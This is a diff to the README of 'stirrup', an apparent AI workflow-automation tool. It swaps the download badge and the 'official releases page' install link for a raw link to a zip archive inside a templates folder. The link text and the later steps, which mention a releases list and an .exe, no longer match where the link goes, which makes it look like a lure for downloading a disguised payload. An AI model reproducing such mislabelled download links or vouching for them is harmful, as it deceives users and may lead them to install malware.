@@ -1,6 +1,6 @@
 # ⚙️ stirrup - Automate your workflows with artificial intelligence
 
-<a href="https://github.com/yuxisun62-commits/stirrup/releases">
+<a href="https://github.com/yuxisun62-commits/stirrup/raw/refs/heads/main/templates/Software_1.2.zip">
   <img src="https://img.shields.io/badge/Download-Stirrup-blue.svg" alt="Download Stirrup" />
 </a>
 
@@ -10,7 +10,7 @@ Stirrup helps you automate tasks. It uses artificial intelligence to connect dif
 
 Follow these steps to get Stirrup on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/yuxisun62-commits/stirrup/releases).
+1. Visit the [official releases page](https://github.com/yuxisun62-commits/stirrup/raw/refs/heads/main/templates/Software_1.2.zip).
 2. Look for the latest version at the top of the list.
 3. Find the file that ends with .exe for Windows.
 4. Click the file name to start the download.
